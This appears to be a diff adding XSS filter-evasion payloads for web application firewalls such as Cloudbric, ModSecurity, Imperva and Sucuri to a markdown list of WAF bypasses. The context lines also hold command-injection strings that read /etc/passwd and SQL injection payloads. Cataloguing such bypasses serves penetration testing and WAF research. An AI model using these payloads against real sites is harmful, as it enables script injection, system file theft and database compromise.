@@ -3377,6 +3377,12 @@ cat$u+/etc$u/passwd$u
 ";cat+/etc/passwd+#
 ```
 
+### Cloudbric
+- [XSS Bypass](https://twitter.com/0xInfection/status/1212331839743873026) by [@0xInfection](https://twitter.com/0xinfection)
+```
+<a69/onclick=[1].findIndex(alert)>pew
+```
+
 ### Comodo 
 - XSS Bypass by [@0xInfection](https://twitter.com/0xinfection)
 ```
@@ -3435,6 +3441,7 @@ Keep-Alive: 300
 ```
 <p draggable=True ondragstart=prompt()>alert
 <bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
+<a69/onclick=[1].findIndex(alert)>click
 ```
 - GET - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
 ```
@@ -3544,6 +3551,10 @@ BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+
 ```
 
 ### ModSecurity
+- [XSS Bypass for CRS 3.2](https://twitter.com/brutelogic/status/1209086328383660033) by [@brutelogic](https://twitter.com/brutelogic)
+```
+<a href="jav%0Dascript&colon;alert(1)">
+````
 - [RCE Payloads Detection Bypass for PL3](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.1)
 ```
 ;+$u+cat+/etc$u/passwd$u
@@ -3594,6 +3605,10 @@ amUserId=1 union select username,password,3,4 from users
 ```
 
 ### Imperva
+- [XSS Bypass](https://twitter.com/0xInfection/status/1212331839743873026) by [@0xInfection](https://twitter.com/0xinfection)
+```
+<a69/onclick=write&lpar;&rpar;>pew
+```
 - [XSS Bypass](https://twitter.com/_ugurercan/status/1188406765735632896) by [@ugurercan](https://twitter.com/_ugurercan)
 ```
 <details/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"/open>
@@ -3695,6 +3710,10 @@ https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<scrip
 ```
 
 ### Sucuri
+- [XSS Bypass (POST Only)](https://twitter.com/brutelogic/status/1209086328383660033) by [@brutelogic](https://twitter.com/brutelogic)
+```
+<a href=javascript&colon;confirm(1)>
+```
 - [Smuggling RCE Payloads](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
 ```
 /???/??t+/???/??ss??
@@ -3769,6 +3788,7 @@ http://host.com/test.asp?file=.%./bla.txt
 - XSS Bypass by [@brute Logic](https://twitter.com/brutelogic)
 ```
 <a href=javas&#99;ript:alert(1)>
+<a href=&#01javascript:alert(1)>
 ```
 - XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
 ```
